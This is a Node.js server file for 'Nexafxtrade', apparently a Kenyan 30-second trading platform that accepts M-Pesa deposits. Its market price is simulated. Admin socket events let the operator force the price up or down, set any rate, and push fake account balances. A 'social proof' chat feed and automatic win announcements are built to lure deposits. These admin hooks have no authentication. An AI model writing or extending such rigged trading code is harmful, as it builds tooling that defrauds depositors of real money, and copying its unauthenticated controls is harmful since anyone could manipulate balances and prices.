/**
 * Nexafxtrade Backend Engine
 * Path: ./server.js
 * Version: 3.2.0 (May 2026)
 * Brand: Nexafxtrade (formerly Nexapaytrade)
 */

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const http = require("http");
const { Server } = require("socket.io");
const connectDB = require("./config/db");
const logger = require("./utils/logger");

// Load Environment Configuration
dotenv.config();

// Initialize Express & HTTP Server
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", 
    methods: ["GET", "POST"]
  }
});

// Middleware Matrix
app.use(cors());
app.use(express.json());

// Database Synchronization
connectDB();

// Global Terminal State Parameters
let currentMarketRate = 8421500; 
let forcedAdminTrend = "AUTO";

// ========================================
// ROUTE REGISTRATION
// ========================================
const authRoutes = require("./routes/auth");
const userRoutes = require("./routes/User");
const paymentRoutes = require("./routes/paymentRoutes");

app.use("/api/auth", authRoutes);
app.use("/api/user", userRoutes);
app.use("/api/payments", paymentRoutes);

app.get("/", (req, res) => {
  res.status(200).json({ 
    status: "Online", 
    terminal: "Nexafxtrade Engine v3.2.0",
    region: "KE-NBO"
  });
});

// ========================================
// REAL-TIME SOCKET ENGINE
// ========================================
io.on("connection", (socket) => {
  logger.info(`New Operator Node Linked: ${socket.id}`);

  // Push initial terminal parameters
  socket.emit('admin-force-market-trend', { trend: forcedAdminTrend });
  socket.emit('market-update', { rate: currentMarketRate });

  // 1. SOCIAL PROOF FEED
  socket.on("send-chat", (data) => {
    io.emit("receive-chat", {
      user: data.user,
      message: data.message,
      time: new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' })
    });
  });

  // 2. ADMINISTRATIVE OVERRIDE HOOKS
  socket.on("admin-force-gateway-rate", (data) => {
    if (data && typeof data.rate === 'number') {
      currentMarketRate = Math.floor(data.rate);
      io.emit("market-update", { rate: currentMarketRate });
    }
  });

  socket.on("admin-matrix-sync", (data) => {
    if (data && data.marketTrend) {
      forcedAdminTrend = data.marketTrend;
      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
      if (data.customSpikeRate && !isNaN(data.customSpikeRate)) {
        currentMarketRate += parseFloat(data.customSpikeRate);
        io.emit("market-update", { rate: currentMarketRate });
      }
    }
  });

  socket.on("admin-force-balance", (data) => {
    if (data && data.user && typeof data.balance === 'number') {
      io.emit("admin-force-balance", { user: data.user, balance: data.balance });
    }
  });

  // 3. 30-SECOND PREDICTION LOOP
  socket.on("place-trade", (data) => {
    const entryPrice = currentMarketRate;
    const amount = parseFloat(data.amount);
    
    logger.trade(`Trade Locked: ${data.type} KES ${amount} @ ${entryPrice}`);

    setTimeout(() => {
      const exitPrice = currentMarketRate;
      let win = false;

      if (data.type === 'BUY' && exitPrice > entryPrice) win = true;
      if (data.type === 'SELL' && exitPrice < entryPrice) win = true;

      const payout = win ? (amount * 1.85) : 0; 

      socket.emit("trade-result", {
        status: win ? "WIN" : "LOSS",
        payout: payout.toFixed(2),
        entry: entryPrice,
        exit: exitPrice
      });

      if (win && amount >= 500) {
        io.emit("receive-chat", {
          user: "System",
          message: `🎉 User ***${socket.id.substring(0,3)} just won KES ${payout.toFixed(0)}!`
        });
      }
    }, 30000); 
  });

  socket.on("disconnect", () => {
    logger.info(`Operator node detached: ${socket.id}`);
  });
});

// ========================================
// MARKET SIMULATION MATRIX (1Hz)
// ========================================
setInterval(() => {
  if (forcedAdminTrend === "AUTO") {
    const shift = (Math.random() - 0.48) * (8000 / 15);
    currentMarketRate = Math.floor(currentMarketRate + shift);
  } else if (forcedAdminTrend === "HIGH") {
    const shift = (Math.random() * (45000 / 15)) + 1800;
    currentMarketRate = Math.floor(currentMarketRate + shift);
  } else if (forcedAdminTrend === "LOW") {
    const shift = -((Math.random() * (45000 / 15)) + 1800);
    currentMarketRate = Math.floor(currentMarketRate + shift);
  }
  io.emit("market-update", { rate: currentMarketRate });
}, 1000);

// ========================================
// MPESA GATEWAY CALLBACK
// ========================================
app.post("/api/mpesa/callback", async (req, res) => {
    const callbackData = req.body.Body.stkCallback;
    if (callbackData.ResultCode === 0) {
        const metadata = callbackData.CallbackMetadata.Item;
        const amount = metadata.find(item => item.Name === 'Amount').Value;
        const phone = metadata.find(item => item.Name === 'PhoneNumber').Value;
        
        logger.mpesa(`Payment Confirmed: KES ${amount} from ${phone}`);
        // Referral 10% bonus logic integration point
    } 
    res.status(200).send("OK");
});

// Port Initialization
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`
  =========================================
  NEXAFXTRADE TERMINAL V3.2.0
  Network: Port ${PORT}
  Database: Online
  Environment: Production
  =========================================
  `);
});
